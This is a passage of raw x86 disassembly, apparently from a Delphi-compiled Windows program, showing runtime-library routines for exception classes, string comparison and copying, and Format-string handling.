  404ad1:	28 40 00             	sub    %al,0x0(%eax)
  404ad4:	d4 28                	aam    $0x28
  404ad6:	40                   	inc    %eax
  404ad7:	00 18                	add    %bl,(%eax)
  404ad9:	29 40 00             	sub    %eax,0x0(%eax)
  404adc:	0d 45 56 61 72       	or     $0x72615645,%eax
  404ae1:	69 61 6e 74 45 72 72 	imul   $0x72724574,0x6e(%ecx),%esp
  404ae8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae9:	72 8b                	jb     0x404a76
  404aeb:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404b02:	00 00                	add    %al,(%eax)
  404b04:	20 4b 40             	and    %cl,0x40(%ebx)
  404b07:	00 10                	add    %dl,(%eax)
  404b09:	00 00                	add    %al,(%eax)
  404b0b:	00 b0 45 40 00 c4    	add    %dh,-0x3bffbfbb(%eax)
  404b11:	29 40 00             	sub    %eax,0x0(%eax)
  404b14:	ac                   	lods   %ds:(%esi),%al
  404b15:	28 40 00             	sub    %al,0x0(%eax)
  404b18:	d4 28                	aam    $0x28
  404b1a:	40                   	inc    %eax
  404b1b:	00 18                	add    %bl,(%eax)
  404b1d:	29 40 00             	sub    %eax,0x0(%eax)
  404b20:	12 45 45             	adc    0x45(%ebp),%al
  404b23:	78 74                	js     0x404b99
  404b25:	65 72 6e             	gs jb  0x404b96
  404b28:	61                   	popa
  404b29:	6c                   	insb   (%dx),%es:(%edi)
  404b2a:	45                   	inc    %ebp
  404b2b:	78 63                	js     0x404b90
  404b2d:	65 70 74             	gs jo  0x404ba4
  404b30:	69 6f 6e 90 53 8b d8 	imul   $0xd88b5390,0x6e(%edi),%ebp
  404b37:	8b cb                	mov    %ebx,%ecx
  404b39:	b2 01                	mov    $0x1,%dl
  404b3b:	b8 8c 49 40 00       	mov    $0x40498c,%eax
  404b40:	e8 4b 0d 00 00       	call   0x405890
  404b45:	e8 6a e3 ff ff       	call   0x402eb4
  404b4a:	5b                   	pop    %ebx
  404b4b:	c3                   	ret
  404b4c:	53                   	push   %ebx
  404b4d:	56                   	push   %esi
  404b4e:	57                   	push   %edi
  404b4f:	8b f9                	mov    %ecx,%edi
  404b51:	8b f2                	mov    %edx,%esi
  404b53:	8b d8                	mov    %eax,%ebx
  404b55:	56                   	push   %esi
  404b56:	57                   	push   %edi
  404b57:	8b cb                	mov    %ebx,%ecx
  404b59:	b2 01                	mov    $0x1,%dl
  404b5b:	b8 8c 49 40 00       	mov    $0x40498c,%eax
  404b60:	e8 9b 0d 00 00       	call   0x405900
  404b65:	e8 4a e3 ff ff       	call   0x402eb4
  404b6a:	5f                   	pop    %edi
  404b6b:	5e                   	pop    %esi
  404b6c:	5b                   	pop    %ebx
  404b6d:	c3                   	ret
  404b6e:	8b c0                	mov    %eax,%eax
  404b70:	53                   	push   %ebx
  404b71:	56                   	push   %esi
  404b72:	8b d8                	mov    %eax,%ebx
  404b74:	8b c3                	mov    %ebx,%eax
  404b76:	e8 19 da ff ff       	call   0x402594
  404b7b:	8b f0                	mov    %eax,%esi
  404b7d:	8b c6                	mov    %esi,%eax
  404b7f:	33 c9                	xor    %ecx,%ecx
  404b81:	8b d3                	mov    %ebx,%edx
  404b83:	e8 f4 db ff ff       	call   0x40277c
  404b88:	8b c6                	mov    %esi,%eax
  404b8a:	5e                   	pop    %esi
  404b8b:	5b                   	pop    %ebx
  404b8c:	c3                   	ret
  404b8d:	8d 40 00             	lea    0x0(%eax),%eax
  404b90:	56                   	push   %esi
  404b91:	57                   	push   %edi
  404b92:	53                   	push   %ebx
  404b93:	89 c6                	mov    %eax,%esi
  404b95:	89 d7                	mov    %edx,%edi
  404b97:	09 c0                	or     %eax,%eax
  404b99:	74 03                	je     0x404b9e
  404b9b:	8b 40 fc             	mov    -0x4(%eax),%eax
  404b9e:	09 d2                	or     %edx,%edx
  404ba0:	74 03                	je     0x404ba5
  404ba2:	8b 52 fc             	mov    -0x4(%edx),%edx
  404ba5:	89 c1                	mov    %eax,%ecx
  404ba7:	39 d1                	cmp    %edx,%ecx
  404ba9:	76 02                	jbe    0x404bad
  404bab:	89 d1                	mov    %edx,%ecx
  404bad:	39 c9                	cmp    %ecx,%ecx
  404baf:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404bb1:	74 2a                	je     0x404bdd
  404bb3:	8a 5e ff             	mov    -0x1(%esi),%bl
  404bb6:	80 fb 61             	cmp    $0x61,%bl
  404bb9:	72 08                	jb     0x404bc3
  404bbb:	80 fb 7a             	cmp    $0x7a,%bl
  404bbe:	77 03                	ja     0x404bc3
  404bc0:	80 eb 20             	sub    $0x20,%bl
  404bc3:	8a 7f ff             	mov    -0x1(%edi),%bh
  404bc6:	80 ff 61             	cmp    $0x61,%bh
  404bc9:	72 08                	jb     0x404bd3
  404bcb:	80 ff 7a             	cmp    $0x7a,%bh
  404bce:	77 03                	ja     0x404bd3
  404bd0:	80 ef 20             	sub    $0x20,%bh
  404bd3:	38 fb                	cmp    %bh,%bl
  404bd5:	74 d8                	je     0x404baf
  404bd7:	0f b6 c3             	movzbl %bl,%eax
  404bda:	0f b6 d7             	movzbl %bh,%edx
  404bdd:	29 d0                	sub    %edx,%eax
  404bdf:	5b                   	pop    %ebx
  404be0:	5f                   	pop    %edi
  404be1:	5e                   	pop    %esi
  404be2:	c3                   	ret
  404be3:	90                   	nop
  404be4:	83 c4 f8             	add    $0xfffffff8,%esp
  404be7:	6a 00                	push   $0x0
  404be9:	89 44 24 04          	mov    %eax,0x4(%esp)
  404bed:	c6 44 24 08 00       	movb   $0x0,0x8(%esp)
  404bf2:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404bf6:	8b c2                	mov    %edx,%eax
  404bf8:	ba 10 4c 40 00       	mov    $0x404c10,%edx
  404bfd:	e8 f6 04 00 00       	call   0x4050f8
  404c02:	59                   	pop    %ecx
  404c03:	5a                   	pop    %edx
  404c04:	c3                   	ret
  404c05:	00 00                	add    %al,(%eax)
  404c07:	00 ff                	add    %bh,%bh
  404c09:	ff                   	(bad)
  404c0a:	ff                   	(bad)
  404c0b:	ff 02                	incl   (%edx)
  404c0d:	00 00                	add    %al,(%eax)
  404c0f:	00 25 64 00 00 53    	add    %ah,0x53000064
  404c15:	51                   	push   %ecx
  404c16:	8b da                	mov    %edx,%ebx
  404c18:	8b d4                	mov    %esp,%edx
  404c1a:	e8 95 db ff ff       	call   0x4027b4
  404c1f:	83 3c 24 00          	cmpl   $0x0,(%esp)
  404c23:	74 02                	je     0x404c27
  404c25:	8b c3                	mov    %ebx,%eax
  404c27:	5a                   	pop    %edx
  404c28:	5b                   	pop    %ebx
  404c29:	c3                   	ret
  404c2a:	8b c0                	mov    %eax,%eax
  404c2c:	53                   	push   %ebx
  404c2d:	56                   	push   %esi
  404c2e:	81 c4 00 fc ff ff    	add    $0xfffffc00,%esp
  404c34:	8b f2                	mov    %edx,%esi
  404c36:	8b d8                	mov    %eax,%ebx
  404c38:	68 00 04 00 00       	push   $0x400
  404c3d:	8d 44 24 04          	lea    0x4(%esp),%eax
  404c41:	50                   	push   %eax
  404c42:	53                   	push   %ebx
  404c43:	a1 14 b0 40 00       	mov    0x40b014,%eax
  404c48:	50                   	push   %eax
  404c49:	e8 fe f8 ff ff       	call   0x40454c
  404c4e:	8b c8                	mov    %eax,%ecx
  404c50:	8b d4                	mov    %esp,%edx
  404c52:	8b c6                	mov    %esi,%eax
  404c54:	e8 1f e6 ff ff       	call   0x403278
  404c59:	81 c4 00 04 00 00    	add    $0x400,%esp
  404c5f:	5e                   	pop    %esi
  404c60:	5b                   	pop    %ebx
  404c61:	c3                   	ret
  404c62:	8b c0                	mov    %eax,%eax
  404c64:	89 fa                	mov    %edi,%edx
  404c66:	89 c7                	mov    %eax,%edi
  404c68:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  404c6d:	30 c0                	xor    %al,%al
  404c6f:	f2 ae                	repnz scas %es:(%edi),%al
  404c71:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  404c76:	29 c8                	sub    %ecx,%eax
  404c78:	89 d7                	mov    %edx,%edi
  404c7a:	c3                   	ret
  404c7b:	90                   	nop
  404c7c:	56                   	push   %esi
  404c7d:	57                   	push   %edi
  404c7e:	89 d6                	mov    %edx,%esi
  404c80:	89 c7                	mov    %eax,%edi
  404c82:	89 ca                	mov    %ecx,%edx
  404c84:	39 f7                	cmp    %esi,%edi
  404c86:	7f 11                	jg     0x404c99
  404c88:	74 2b                	je     0x404cb5
  404c8a:	c1 e9 02             	shr    $0x2,%ecx
  404c8d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404c8f:	89 d1                	mov    %edx,%ecx
  404c91:	83 e1 03             	and    $0x3,%ecx
  404c94:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404c96:	5f                   	pop    %edi
  404c97:	5e                   	pop    %esi
  404c98:	c3                   	ret
  404c99:	8d 74 0e ff          	lea    -0x1(%esi,%ecx,1),%esi
  404c9d:	8d 7c 0f ff          	lea    -0x1(%edi,%ecx,1),%edi
  404ca1:	83 e1 03             	and    $0x3,%ecx
  404ca4:	fd                   	std
  404ca5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404ca7:	83 ee 03             	sub    $0x3,%esi
  404caa:	83 ef 03             	sub    $0x3,%edi
  404cad:	89 d1                	mov    %edx,%ecx
  404caf:	c1 e9 02             	shr    $0x2,%ecx
  404cb2:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404cb4:	fc                   	cld
  404cb5:	5f                   	pop    %edi
  404cb6:	5e                   	pop    %esi
  404cb7:	c3                   	ret
  404cb8:	57                   	push   %edi
  404cb9:	56                   	push   %esi
  404cba:	53                   	push   %ebx
  404cbb:	89 c6                	mov    %eax,%esi
  404cbd:	89 d7                	mov    %edx,%edi
  404cbf:	89 cb                	mov    %ecx,%ebx
  404cc1:	30 c0                	xor    %al,%al
  404cc3:	85 c9                	test   %ecx,%ecx
  404cc5:	74 05                	je     0x404ccc
  404cc7:	f2 ae                	repnz scas %es:(%edi),%al
  404cc9:	75 01                	jne    0x404ccc
  404ccb:	41                   	inc    %ecx
  404ccc:	29 cb                	sub    %ecx,%ebx
  404cce:	89 f7                	mov    %esi,%edi
  404cd0:	89 d6                	mov    %edx,%esi
  404cd2:	89 fa                	mov    %edi,%edx
  404cd4:	89 d9                	mov    %ebx,%ecx
  404cd6:	c1 e9 02             	shr    $0x2,%ecx
  404cd9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404cdb:	89 d9                	mov    %ebx,%ecx
  404cdd:	83 e1 03             	and    $0x3,%ecx
  404ce0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404ce2:	aa                   	stos   %al,%es:(%edi)
  404ce3:	89 d0                	mov    %edx,%eax
  404ce5:	5b                   	pop    %ebx
  404ce6:	5e                   	pop    %esi
  404ce7:	5f                   	pop    %edi
  404ce8:	c3                   	ret
  404ce9:	8d 40 00             	lea    0x0(%eax),%eax
  404cec:	57                   	push   %edi
  404ced:	50                   	push   %eax
  404cee:	89 c7                	mov    %eax,%edi
  404cf0:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  404cf5:	30 c0                	xor    %al,%al
  404cf7:	f2 ae                	repnz scas %es:(%edi),%al
  404cf9:	f7 d1                	not    %ecx
  404cfb:	5f                   	pop    %edi
  404cfc:	88 d0                	mov    %dl,%al
  404cfe:	f2 ae                	repnz scas %es:(%edi),%al
  404d00:	b8 00 00 00 00       	mov    $0x0,%eax
  404d05:	75 03                	jne    0x404d0a
  404d07:	89 f8                	mov    %edi,%eax
  404d09:	48                   	dec    %eax
  404d0a:	5f                   	pop    %edi
  404d0b:	c3                   	ret
  404d0c:	57                   	push   %edi
  404d0d:	89 c7                	mov    %eax,%edi
  404d0f:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  404d14:	30 c0                	xor    %al,%al
  404d16:	f2 ae                	repnz scas %es:(%edi),%al
  404d18:	f7 d1                	not    %ecx
  404d1a:	fd                   	std
  404d1b:	4f                   	dec    %edi
  404d1c:	88 d0                	mov    %dl,%al
  404d1e:	f2 ae                	repnz scas %es:(%edi),%al
  404d20:	b8 00 00 00 00       	mov    $0x0,%eax
  404d25:	75 03                	jne    0x404d2a
  404d27:	89 f8                	mov    %edi,%eax
  404d29:	40                   	inc    %eax
  404d2a:	fc                   	cld
  404d2b:	5f                   	pop    %edi
  404d2c:	c3                   	ret
  404d2d:	8d 40 00             	lea    0x0(%eax),%eax
  404d30:	53                   	push   %ebx
  404d31:	56                   	push   %esi
  404d32:	8b f2                	mov    %edx,%esi
  404d34:	8b d8                	mov    %eax,%ebx
  404d36:	8b c6                	mov    %esi,%eax
  404d38:	8b d3                	mov    %ebx,%edx
  404d3a:	e8 85 e5 ff ff       	call   0x4032c4
  404d3f:	5e                   	pop    %esi
  404d40:	5b                   	pop    %ebx
  404d41:	c3                   	ret
  404d42:	8b c0                	mov    %eax,%eax
  404d44:	53                   	push   %ebx
  404d45:	56                   	push   %esi
  404d46:	83 c4 d8             	add    $0xffffffd8,%esp
  404d49:	8b d9                	mov    %ecx,%ebx
  404d4b:	8b f0                	mov    %eax,%esi
  404d4d:	83 fb 1f             	cmp    $0x1f,%ebx
  404d50:	7e 05                	jle    0x404d57
  404d52:	bb 1f 00 00 00       	mov    $0x1f,%ebx
  404d57:	8b c4                	mov    %esp,%eax
  404d59:	8b cb                	mov    %ebx,%ecx
  404d5b:	e8 1c ff ff ff       	call   0x404c7c
  404d60:	c6 04 1c 00          	movb   $0x0,(%esp,%ebx,1)
  404d64:	8b c4                	mov    %esp,%eax
  404d66:	89 44 24 20          	mov    %eax,0x20(%esp)
  404d6a:	c6 44 24 24 06       	movb   $0x6,0x24(%esp)
  404d6f:	8d 54 24 20          	lea    0x20(%esp),%edx
  404d73:	8d 86 a0 ff 00 00    	lea    0xffa0(%esi),%eax
  404d79:	33 c9                	xor    %ecx,%ecx
  404d7b:	e8 cc fd ff ff       	call   0x404b4c
  404d80:	83 c4 28             	add    $0x28,%esp
  404d83:	5e                   	pop    %esi
  404d84:	5b                   	pop    %ebx
  404d85:	c3                   	ret
  404d86:	8b c0                	mov    %eax,%eax
  404d88:	53                   	push   %ebx
  404d89:	56                   	push   %esi
  404d8a:	8b f2                	mov    %edx,%esi
  404d8c:	8b d8                	mov    %eax,%ebx
  404d8e:	8b c3                	mov    %ebx,%eax
  404d90:	8b d6                	mov    %esi,%edx
  404d92:	e8 0d ec ff ff       	call   0x4039a4
  404d97:	5e                   	pop    %esi
  404d98:	5b                   	pop    %ebx
  404d99:	c3                   	ret
  404d9a:	8b c0                	mov    %eax,%eax
  404d9c:	53                   	push   %ebx
  404d9d:	8b d8                	mov    %eax,%ebx
  404d9f:	8b c3                	mov    %ebx,%eax
  404da1:	e8 f2 e3 ff ff       	call   0x403198
  404da6:	5b                   	pop    %ebx
  404da7:	c3                   	ret
  404da8:	55                   	push   %ebp
  404da9:	8b ec                	mov    %esp,%ebp
  404dab:	83 c4 b8             	add    $0xffffffb8,%esp
  404dae:	53                   	push   %ebx
  404daf:	56                   	push   %esi
  404db0:	57                   	push   %edi
  404db1:	89 c7                	mov    %eax,%edi
  404db3:	89 ce                	mov    %ecx,%esi
  404db5:	03 4d 10             	add    0x10(%ebp),%ecx
  404db8:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404dbb:	31 c0                	xor    %eax,%eax
  404dbd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404dc0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404dc3:	09 d2                	or     %edx,%edx
  404dc5:	74 0e                	je     0x404dd5
  404dc7:	39 ce                	cmp    %ecx,%esi
  404dc9:	74 0a                	je     0x404dd5
  404dcb:	ac                   	lods   %ds:(%esi),%al
  404dcc:	80 f8 25             	cmp    $0x25,%al
  404dcf:	74 0e                	je     0x404ddf
  404dd1:	aa                   	stos   %al,%es:(%edi)
  404dd2:	4a                   	dec    %edx
  404dd3:	75 f2                	jne    0x404dc7
  404dd5:	89 f8                	mov    %edi,%eax
  404dd7:	2b 45 fc             	sub    -0x4(%ebp),%eax
  404dda:	e9 c5 02 00 00       	jmp    0x4050a4
  404ddf:	39 ce                	cmp    %ecx,%esi
  404de1:	74 f2                	je     0x404dd5
  404de3:	ac                   	lods   %ds:(%esi),%al
  404de4:	80 f8 25             	cmp    $0x25,%al
  404de7:	74 e8                	je     0x404dd1
  404de9:	8d 5e fe             	lea    -0x2(%esi),%ebx
  404dec:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404def:	88 45 ef             	mov    %al,-0x11(%ebp)
  404df2:	80 f8 2d             	cmp    $0x2d,%al
  404df5:	75 05                	jne    0x404dfc
  404df7:	39 ce                	cmp    %ecx,%esi
  404df9:	74 da                	je     0x404dd5
  404dfb:	ac                   	lods   %ds:(%esi),%al
  404dfc:	e8 80 00 00 00       	call   0x404e81
  404e01:	80 f8 3a             	cmp    $0x3a,%al
  404e04:	75 0a                	jne    0x404e10
  404e06:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404e09:	39 ce                	cmp    %ecx,%esi
  404e0b:	74 c8                	je     0x404dd5
  404e0d:	ac                   	lods   %ds:(%esi),%al
  404e0e:	eb df                	jmp    0x404def
  404e10:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404e13:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  404e18:	80 f8 2e             	cmp    $0x2e,%al
  404e1b:	75 0a                	jne    0x404e27
  404e1d:	39 ce                	cmp    %ecx,%esi
  404e1f:	74 b4                	je     0x404dd5
  404e21:	ac                   	lods   %ds:(%esi),%al
  404e22:	e8 5a 00 00 00       	call   0x404e81
  404e27:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404e2a:	89 75 e0             	mov    %esi,-0x20(%ebp)
  404e2d:	51                   	push   %ecx
  404e2e:	52                   	push   %edx
  404e2f:	e8 96 00 00 00       	call   0x404eca
  404e34:	5a                   	pop    %edx
  404e35:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  404e38:	29 cb                	sub    %ecx,%ebx
  404e3a:	73 02                	jae    0x404e3e
  404e3c:	31 db                	xor    %ebx,%ebx
  404e3e:	80 7d ef 2d          	cmpb   $0x2d,-0x11(%ebp)
  404e42:	75 0a                	jne    0x404e4e
  404e44:	29 ca                	sub    %ecx,%edx
  404e46:	73 04                	jae    0x404e4c
  404e48:	01 d1                	add    %edx,%ecx
  404e4a:	31 d2                	xor    %edx,%edx
  404e4c:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404e4e:	87 cb                	xchg   %ecx,%ebx
  404e50:	29 ca                	sub    %ecx,%edx
  404e52:	73 04                	jae    0x404e58
  404e54:	01 d1                	add    %edx,%ecx
  404e56:	31 d2                	xor    %edx,%edx
  404e58:	b0 20                	mov    $0x20,%al
  404e5a:	f3 aa                	rep stos %al,%es:(%edi)
  404e5c:	87 cb                	xchg   %ecx,%ebx
  404e5e:	29 ca                	sub    %ecx,%edx
  404e60:	73 04                	jae    0x404e66
  404e62:	01 d1                	add    %edx,%ecx
  404e64:	31 d2                	xor    %edx,%edx
  404e66:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404e68:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404e6c:	74 0a                	je     0x404e78
  404e6e:	52                   	push   %edx
  404e6f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404e72:	e8 25 ff ff ff       	call   0x404d9c
  404e77:	5a                   	pop    %edx
  404e78:	59                   	pop    %ecx
  404e79:	8b 75 e0             	mov    -0x20(%ebp),%esi
  404e7c:	e9 42 ff ff ff       	jmp    0x404dc3
  404e81:	31 db                	xor    %ebx,%ebx
  404e83:	80 f8 2a             	cmp    $0x2a,%al
  404e86:	74 22                	je     0x404eaa
  404e88:	80 f8 30             	cmp    $0x30,%al
  404e8b:	72 3c                	jb     0x404ec9
  404e8d:	80 f8 39             	cmp    $0x39,%al
  404e90:	77 37                	ja     0x404ec9
  404e92:	6b db 0a             	imul   $0xa,%ebx,%ebx
  404e95:	80 e8 30             	sub    $0x30,%al
  404e98:	0f b6 c0             	movzbl %al,%eax
  404e9b:	01 c3                	add    %eax,%ebx
  404e9d:	39 ce                	cmp    %ecx,%esi
  404e9f:	74 03                	je     0x404ea4
  404ea1:	ac                   	lods   %ds:(%esi),%al
  404ea2:	eb e4                	jmp    0x404e88
  404ea4:	58                   	pop    %eax
  404ea5:	e9 2b ff ff ff       	jmp    0x404dd5
  404eaa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404ead:	3b 45 08             	cmp    0x8(%ebp),%eax
  404eb0:	77 12                	ja     0x404ec4
  404eb2:	ff 45 f8             	incl   -0x8(%ebp)
  404eb5:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404eb8:	80 7c c3 04 00       	cmpb   $0x0,0x4(%ebx,%eax,8)
  404ebd:	8b 1c c3             	mov    (%ebx,%eax,8),%ebx
  404ec0:	74 02                	je     0x404ec4
  404ec2:	31 db                	xor    %ebx,%ebx
  404ec4:	39 ce                	cmp    %ecx,%esi
  404ec6:	74 dc                	je     0x404ea4
  404ec8:	ac                   	lods   %ds:(%esi),%al
  404ec9:	c3                   	ret
  404eca:	24 df                	and    $0xdf,%al
  404ecc:	88 c1                	mov    %al,%cl
  404ece:	b8 01 00 00 00       	mov    $0x1,%eax
  404ed3:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404ed6:	3b 5d 08             	cmp    0x8(%ebp),%ebx
  404ed9:	77 50                	ja     0x404f2b
  404edb:	ff 45 f8             	incl   -0x8(%ebp)
  404ede:	8b 75 0c             	mov    0xc(%ebp),%esi
  404ee1:	8d 34 de             	lea    (%esi,%ebx,8),%esi
  404ee4:	8b 06                	mov    (%esi),%eax
  404ee6:	0f b6 5e 04          	movzbl 0x4(%esi),%ebx
  404eea:	ff 24 9d f1 4e 40 00 	jmp    *0x404ef1(,%ebx,4)
  404ef1:	38 4f 40             	cmp    %cl,0x40(%edi)
  404ef4:	00 29                	add    %ch,(%ecx)
  404ef6:	4f                   	dec    %edi
  404ef7:	40                   	inc    %eax
  404ef8:	00 9b 4f 40 00 32    	add    %bl,0x3200404f(%ebx)
  404efe:	50                   	push   %eax
  404eff:	40                   	inc    %eax
  404f00:	00 c7                	add    %al,%bh
  404f02:	4f                   	dec    %edi
  404f03:	40                   	inc    %eax
  404f04:	00 14 50             	add    %dl,(%eax,%edx,2)
  404f07:	40                   	inc    %eax
  404f08:	00 f4                	add    %dh,%ah
  404f0a:	4f                   	dec    %edi
  404f0b:	40                   	inc    %eax
  404f0c:	00 29                	add    %ch,(%ecx)
  404f0e:	4f                   	dec    %edi
  404f0f:	40                   	inc    %eax
  404f10:	00 29                	add    %ch,(%ecx)
  404f12:	4f                   	dec    %edi
  404f13:	40                   	inc    %eax
  404f14:	00 29                	add    %ch,(%ecx)
  404f16:	4f                   	dec    %edi
  404f17:	40                   	inc    %eax
  404f18:	00 29                	add    %ch,(%ecx)
  404f1a:	4f                   	dec    %edi
  404f1b:	40                   	inc    %eax
  404f1c:	00 d8                	add    %bl,%al
  404f1e:	4f                   	dec    %edi
  404f1f:	40                   	inc    %eax
  404f20:	00 2e                	add    %ch,(%esi)
  404f22:	50                   	push   %eax
  404f23:	40                   	inc    %eax
  404f24:	00 a6 4f 40 00 31    	add    %ah,0x3100404f(%esi)
  404f2a:	c0 8b 55 f0 8b 4d e0 	rorb   $0xe0,0x4d8bf055(%ebx)
  404f31:	29 d1                	sub    %edx,%ecx
  404f33:	e8 0c fe ff ff       	call   0x404d44
  404f38:	80 f9 44             	cmp    $0x44,%cl
  404f3b:	74 11                	je     0x404f4e
  404f3d:	80 f9 55             	cmp    $0x55,%cl
  404f40:	74 1e                	je     0x404f60
  404f42:	80 f9 58             	cmp    $0x58,%cl
  404f45:	75 e2                	jne    0x404f29
  404f47:	b9 10 00 00 00       	mov    $0x10,%ecx
  404f4c:	eb 17                	jmp    0x404f65
  404f4e:	09 c0                	or     %eax,%eax
  404f50:	79 0e                	jns    0x404f60
  404f52:	f7 d8                	neg    %eax
  404f54:	e8 07 00 00 00       	call   0x404f60
  404f59:	b0 2d                	mov    $0x2d,%al
  404f5b:	41                   	inc    %ecx
  404f5c:	4e                   	dec    %esi
  404f5d:	88 06                	mov    %al,(%esi)
  404f5f:	c3                   	ret
  404f60:	b9 0a 00 00 00       	mov    $0xa,%ecx
  404f65:	8d 75 c8             	lea    -0x38(%ebp),%esi
  404f68:	31 d2                	xor    %edx,%edx
  404f6a:	f7 f1                	div    %ecx
  404f6c:	80 c2 30             	add    $0x30,%dl
  404f6f:	80 fa 3a             	cmp    $0x3a,%dl
  404f72:	72 03                	jb     0x404f77
  404f74:	80 c2 07             	add    $0x7,%dl
  404f77:	4e                   	dec    %esi
  404f78:	88 16                	mov    %dl,(%esi)
  404f7a:	09 c0                	or     %eax,%eax
  404f7c:	75 ea                	jne    0x404f68
  404f7e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404f81:	29 f1                	sub    %esi,%ecx
  404f83:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404f86:	83 fa 10             	cmp    $0x10,%edx
  404f89:	72 01                	jb     0x404f8c
  404f8b:	c3                   	ret
  404f8c:	29 ca                	sub    %ecx,%edx
  404f8e:	76 0a                	jbe    0x404f9a
  404f90:	01 d1                	add    %edx,%ecx
  404f92:	b0 30                	mov    $0x30,%al
  404f94:	4e                   	dec    %esi
  404f95:	88 06                	mov    %al,(%esi)
  404f97:	4a                   	dec    %edx
  404f98:	75 fa                	jne    0x404f94
  404f9a:	c3                   	ret
  404f9b:	80 f9 53             	cmp    $0x53,%cl
  404f9e:	75 89                	jne    0x404f29
  404fa0:	b9 01 00 00 00       	mov    $0x1,%ecx
  404fa5:	c3                   	ret
  404fa6:	80 f9 53             	cmp    $0x53,%cl
  404fa9:	0f 85 7a ff ff ff    	jne    0x404f29
  404faf:	66 83 38 01          	cmpw   $0x1,(%eax)
  404fb3:	76 0f                	jbe    0x404fc4
  404fb5:	89 c2                	mov    %eax,%edx
  404fb7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404fba:	e8 c9 fd ff ff       	call   0x404d88
  404fbf:	8b 75 f4             	mov    -0xc(%ebp),%esi
  404fc2:	eb 1f                	jmp    0x404fe3
  404fc4:	31 c9                	xor    %ecx,%ecx
  404fc6:	c3                   	ret
  404fc7:	80 f9 53             	cmp    $0x53,%cl
  404fca:	0f 85 59 ff ff ff    	jne    0x404f29
  404fd0:	89 c6                	mov    %eax,%esi
  404fd2:	ac                   	lods   %ds:(%esi),%al
  404fd3:	0f b6 c8             	movzbl %al,%ecx
  404fd6:	eb 12                	jmp    0x404fea
  404fd8:	80 f9 53             	cmp    $0x53,%cl
  404fdb:	0f 85 48 ff ff ff    	jne    0x404f29
  404fe1:	89 c6                	mov    %eax,%esi
  404fe3:	09 f6                	or     %esi,%esi
  404fe5:	74 dd                	je     0x404fc4
  404fe7:	8b 4e fc             	mov    -0x4(%esi),%ecx
  404fea:	3b 4d e4             	cmp    -0x1c(%ebp),%ecx
  404fed:	77 01                	ja     0x404ff0
  404fef:	c3                   	ret
  404ff0:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404ff3:	c3                   	ret
  404ff4:	80 f9 53             	cmp    $0x53,%cl
  404ff7:	0f 85 2c ff ff ff    	jne    0x404f29
  404ffd:	89 c6                	mov    %eax,%esi
  404fff:	57                   	push   %edi
  405000:	89 c7                	mov    %eax,%edi
  405002:	30 c0                	xor    %al,%al
  405004:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  405007:	e3 05                	jecxz  0x40500e
  405009:	f2 ae                	repnz scas %es:(%edi),%al
  40500b:	75 01                	jne    0x40500e
  40500d:	4f                   	dec    %edi
  40500e:	89 f9                	mov    %edi,%ecx
  405010:	29 f1                	sub    %esi,%ecx
  405012:	5f                   	pop    %edi
  405013:	c3                   	ret
  405014:	80 f9 50             	cmp    $0x50,%cl
  405017:	0f 85 0c ff ff ff    	jne    0x404f29
  40501d:	c7 45 e4 08 00 00 00 	movl   $0x8,-0x1c(%ebp)
  405024:	b9 10 00 00 00       	mov    $0x10,%ecx
  405029:	e9 37 ff ff ff       	jmp    0x404f65
  40502e:	b7 01                	mov    $0x1,%bh
  405030:	eb 02                	jmp    0x405034
  405032:	b7 00                	mov    $0x0,%bh
  405034:	89 c6                	mov    %eax,%esi
  405036:	b3 00                	mov    $0x0,%bl
  405038:	80 f9 47             	cmp    $0x47,%cl
  40503b:	74 3f                	je     0x40507c
  40503d:	b3 01                	mov    $0x1,%bl
  40503f:	80 f9 45             	cmp    $0x45,%cl
  405042:	74 38                	je     0x40507c
  405044:	b3 02                	mov    $0x2,%bl
  405046:	80 f9 46             	cmp    $0x46,%cl
  405049:	74 12                	je     0x40505d
  40504b:	b3 03                	mov    $0x3,%bl
  40504d:	80 f9 4e             	cmp    $0x4e,%cl
  405050:	74 0b                	je     0x40505d
  405052:	80 f9 4d             	cmp    $0x4d,%cl
  405055:	0f 85 ce fe ff ff    	jne    0x404f29
  40505b:	b3 04                	mov    $0x4,%bl
  40505d:	b8 12 00 00 00       	mov    $0x12,%eax
  405062:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  405065:	39 c2                	cmp    %eax,%edx
  405067:	76 25                	jbe    0x40508e
  405069:	ba 02 00 00 00       	mov    $0x2,%edx
  40506e:	80 f9 4d             	cmp    $0x4d,%cl
  405071:	75 1b                	jne    0x40508e
  405073:	0f b6 15 9c b4 40 00 	movzbl 0x40b49c,%edx
  40507a:	eb 12                	jmp    0x40508e
